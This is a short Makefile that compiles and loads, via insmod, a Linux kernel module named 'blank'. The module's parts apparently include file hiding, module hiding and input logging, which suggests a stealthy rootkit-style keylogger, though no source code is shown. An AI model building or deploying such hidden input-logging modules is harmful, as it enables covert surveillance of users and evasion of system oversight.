# Makefile with support for multiple files for kernel modules based on:
# http://www.paguilar.org/blog/?p=7

# Make sure you run with sudo if you install/uninstall!

# If it complains about the module not existing when you run install, don't worry - it's just
# trying to uninstall any previously running instances for you, and will install it for you anyway

.PHONY: environmentSpecificOptions.h

moduleName = blank
obj-m += $(moduleName).o
blank-objs += main.o fileHide.o moduleHide.o outputDevice.o logInput.o buffer/buffer.o
#TODO: fix location buffer is build - Ensure "buffer/makefile"  does not generate a conflicting ".o" file

PWD = $(shell pwd)

#todo: automatically run buffer test

all: environmentSpecificOptions.h
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean

environmentSpecificOptions.h: 	 # we probably should avoid the need to be root to compile
	./getEnvironmentSpecificOptions.sh > environmentSpecificOptions.h
	

install: all uninstallSilently
	insmod ./$(moduleName).ko

uninstall:
	-rmmod $(moduleName)
	
uninstallSilently:
	-@rmmod $(moduleName)
